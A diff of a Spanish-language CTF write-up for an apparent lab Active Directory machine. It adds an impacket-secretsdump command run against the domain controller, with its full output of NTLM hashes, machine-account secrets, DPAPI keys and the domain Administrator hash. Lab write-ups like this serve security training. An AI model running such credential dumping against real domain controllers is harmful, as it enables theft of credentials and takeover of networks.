@@ -265,7 +265,36 @@ Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del us
 
 el hash que colocaras tendria que ser como este:
 
-![Hash](hash.png)
+```html
+❯ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+COOCTUS\DC$:plain_password_hex:ca5a968a566c9e87ed1996c113574152ea825f289bfc584a5e471ece821abaa5278be39b6bf2504be68731e9d47a0ae42959c77be51e20b36a38739cf2174d483cc8b7481e29daf3b2764b8b30c7bf073800b93ada31d0f706c631ea09368f18db54e9fea49d02c6628fce8376fe78d8fb34eef3ada0a61ab0adb63c63af095f6c34b29a451c900b6ace8550cec3d86bf79c093dd6d187116e5bb4ca5d04bb9521b1805782ad0d1b5699271c3824ee89f604a0a887fa33438f30bcd76b60f022fc97d979bb61a64824a49c7f9a20e7ae80e8f66cb7a41a04059eb54fd532ff3a4f7d3e74d9696609edd3a28c9420e6bd
+COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:726ee92a315d6d47b7553cb71a2b92a7:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
+dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
+[*] NL$KM 
+ 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
+ 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
+ 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
+ 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
+NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
+```
 
 #### Post Explotacion:
 
@@ -299,4 +328,4 @@ hacemos un `type root.txt` y ahi estaria la bandera root, y con eso estaria term
 
 [My Community](https://t.me/Un0zandC3r0z).
 
-![CTF Terminada](parker.png)
+![Ctf Crocc Crew Terminada.](parker.gif)
